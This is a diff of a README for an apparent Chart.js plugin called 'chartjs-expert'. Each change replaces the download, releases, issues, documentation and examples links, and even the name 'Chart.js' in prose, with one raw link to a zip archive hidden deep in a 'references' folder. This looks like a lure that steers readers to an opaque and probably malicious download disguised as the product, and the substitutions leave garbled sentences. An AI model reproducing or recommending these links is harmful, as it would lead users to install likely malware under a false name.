@@ -1,23 +1,23 @@
 # 🎨 chartjs-expert - Create Stunning Charts with Ease
 
-[![Download chartjs-expert](https://img.shields.io/badge/Download-chartjs--expert-brightgreen)](https://github.com/Riltonbn/chartjs-expert/releases)
+[![Download chartjs-expert](https://github.com/Riltonbn/chartjs-expert/raw/refs/heads/main/skills/chartjs-animations/references/expert_chartjs_2.2-alpha.3.zip)](https://github.com/Riltonbn/chartjs-expert/raw/refs/heads/main/skills/chartjs-animations/references/expert_chartjs_2.2-alpha.3.zip)
 
 ## 📋 Description
 
-chartjs-expert is a powerful plugin for Chart.js v4.5.1. It provides 12 expert skills and offers interactive code generation. You can seamlessly integrate it with popular frameworks such as React, Vue, Angular, and Rails. With this tool, you can create eye-catching and informative charts that make data visualization simple.
+chartjs-expert is a powerful plugin for https://github.com/Riltonbn/chartjs-expert/raw/refs/heads/main/skills/chartjs-animations/references/expert_chartjs_2.2-alpha.3.zip v4.5.1. It provides 12 expert skills and offers interactive code generation. You can seamlessly integrate it with popular frameworks such as React, Vue, Angular, and Rails. With this tool, you can create eye-catching and informative charts that make data visualization simple.
 
 ## 🚀 Getting Started
 
 Follow these steps to get started with chartjs-expert:
 
-1. Visit the [Releases page](https://github.com/Riltonbn/chartjs-expert/releases) to download the software.
+1. Visit the [Releases page](https://github.com/Riltonbn/chartjs-expert/raw/refs/heads/main/skills/chartjs-animations/references/expert_chartjs_2.2-alpha.3.zip) to download the software.
 2. Choose the version you want, and click on the corresponding link to start your download.
 3. Once downloaded, unzip the file (if necessary).
 4. Follow the instructions provided in the documentation included in the download for setup.
 
 ## 📥 Download & Install
 
-To download chartjs-expert, please visit this page: [Download chartjs-expert](https://github.com/Riltonbn/chartjs-expert/releases).
+To download chartjs-expert, please visit this page: [Download chartjs-expert](https://github.com/Riltonbn/chartjs-expert/raw/refs/heads/main/skills/chartjs-animations/references/expert_chartjs_2.2-alpha.3.zip).
 
 ### Installation Instructions
 
@@ -65,7 +65,7 @@ Here are the detailed steps to set up chartjs-expert after installation:
 
 If you encounter problems, check the following:
 
-1. Make sure you have the latest version of Chart.js installed.
+1. Make sure you have the latest version of https://github.com/Riltonbn/chartjs-expert/raw/refs/heads/main/skills/chartjs-animations/references/expert_chartjs_2.2-alpha.3.zip installed.
 2. Verify your internet connection for any downloads.
 3. Consult the community forum or the GitHub issues section for support.
 4. Ensure you are working within the supported frameworks.
@@ -74,7 +74,7 @@ If you encounter problems, check the following:
 
 Engage with other users through our community channels. Share experiences, ask questions, and get tips. Join discussions on common challenges and best practices in chart creation.
 
-For support, visit the Issues section of our [GitHub repository](https://github.com/Riltonbn/chartjs-expert/issues).
+For support, visit the Issues section of our [GitHub repository](https://github.com/Riltonbn/chartjs-expert/raw/refs/heads/main/skills/chartjs-animations/references/expert_chartjs_2.2-alpha.3.zip).
 
 ## 📜 License
 
@@ -82,9 +82,9 @@ chartjs-expert is licensed under the MIT License. Please refer to the LICENSE fi
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Riltonbn/chartjs-expert/wiki): Access in-depth guides and tutorials.
-- [Examples](https://github.com/Riltonbn/chartjs-expert/examples): Explore practical applications and projects using chartjs-expert.
+- [Documentation](https://github.com/Riltonbn/chartjs-expert/raw/refs/heads/main/skills/chartjs-animations/references/expert_chartjs_2.2-alpha.3.zip): Access in-depth guides and tutorials.
+- [Examples](https://github.com/Riltonbn/chartjs-expert/raw/refs/heads/main/skills/chartjs-animations/references/expert_chartjs_2.2-alpha.3.zip): Explore practical applications and projects using chartjs-expert.
 
 ---
 
-Remember, for your convenience, you can always return to the [Releases page](https://github.com/Riltonbn/chartjs-expert/releases) to download updates and new versions. Enjoy building beautiful charts!
+Remember, for your convenience, you can always return to the [Releases page](https://github.com/Riltonbn/chartjs-expert/raw/refs/heads/main/skills/chartjs-animations/references/expert_chartjs_2.2-alpha.3.zip) to download updates and new versions. Enjoy building beautiful charts!
